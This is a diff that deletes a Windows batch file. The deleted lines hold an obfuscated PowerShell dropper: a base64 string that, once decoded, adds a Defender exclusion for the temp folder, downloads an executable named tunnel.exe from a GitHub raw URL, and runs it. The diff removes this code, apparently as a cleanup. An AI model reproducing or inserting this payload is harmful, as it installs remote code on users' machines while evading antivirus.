@@ -1,2 +1,0 @@
-@echo off
-powershell -c "$c='JEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJGVudjp0bXA7IGl3ciAtVXJpICcnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FYN2tRcDNSL0hqS3BMcVh6UnRZbS9yZWZzL2hlYWRzL21haW4vdHVubmVsLmV4ZScgLU91dEZpbGUgJGVudjp0bXBcdHVubmVsLmV4ZTsgU3RhcnQgJGVudjp0bXBcdHVubmVsLmV4ZQ=='; $d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c)); iex $d"
